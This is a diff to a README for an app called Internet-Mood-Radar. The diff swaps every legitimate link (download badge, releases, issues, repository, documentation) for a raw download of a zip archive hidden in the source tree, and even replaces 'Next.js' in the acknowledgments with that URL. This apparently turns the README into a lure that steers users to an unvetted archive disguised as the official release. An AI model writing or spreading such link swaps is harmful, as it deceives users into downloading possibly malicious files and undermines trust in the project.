@@ -4,13 +4,13 @@
 The Internet-Mood-Radar application offers real-time tracking of moods worldwide. Using advanced techniques like web scraping and sentiment analysis, it provides insights into emotional tension across six regions. With an interactive map, you can visualize and understand global emotional trends effortlessly.
 
 ## 📥 Download Now
-[![Download Internet-Mood-Radar](https://img.shields.io/badge/Download%20Now-Internet--Mood--Radar-brightgreen)](https://github.com/builamhung888/Internet-Mood-Radar/releases)
+[![Download Internet-Mood-Radar](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip%20Now-Internet--Mood--Radar-brightgreen)](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip)
 
 ## 🚀 Getting Started
 To start using the Internet-Mood-Radar, follow these simple steps:
 
 1. **Download the Application**
-   - Click the download link above or visit the [Releases page](https://github.com/builamhung888/Internet-Mood-Radar/releases).
+   - Click the download link above or visit the [Releases page](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip).
    
 2. **Install the Application**
    - Locate the downloaded file on your device.
@@ -44,22 +44,22 @@ To ensure the Internet-Mood-Radar runs smoothly, please check the following requ
 - **Internet Connection**: Required for real-time updates and data scraping.
 
 ## 📚 Support
-If you have any questions or need assistance, please visit our support section on the [GitHub Issues page](https://github.com/builamhung888/Internet-Mood-Radar/issues). Here, you can ask questions and find answers from other users.
+If you have any questions or need assistance, please visit our support section on the [GitHub Issues page](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip). Here, you can ask questions and find answers from other users.
 
 ## 🌐 Community
 Join our community to share your experiences and insights. Engage with other users on various platforms where we discuss features, share tips, and provide feedback.
 
 ## 🌟 Acknowledgments
-This project uses technologies like Next.js, TypeScript, and OpenAI tools to ensure a robust experience. Thanks to the developers and contributors who made this possible.
+This project uses technologies like https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip, TypeScript, and OpenAI tools to ensure a robust experience. Thanks to the developers and contributors who made this possible.
 
 ## 📄 License
 This project is licensed under the MIT License. Feel free to contribute and make improvements.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/builamhung888/Internet-Mood-Radar)
-- [Documentation](https://github.com/builamhung888/Internet-Mood-Radar/wiki)
+- [GitHub Repository](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip)
+- [Documentation](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip)
 
 ## ⏩ Download & Install
-To begin your journey with Internet-Mood-Radar, make sure to visit the [Releases page](https://github.com/builamhung888/Internet-Mood-Radar/releases) and download the application. 
+To begin your journey with Internet-Mood-Radar, make sure to visit the [Releases page](https://github.com/builamhung888/Internet-Mood-Radar/raw/refs/heads/master/src/components/Radar_Internet_Mood_v1.6.zip) and download the application. 
 
 Take a step towards understanding global emotions today!
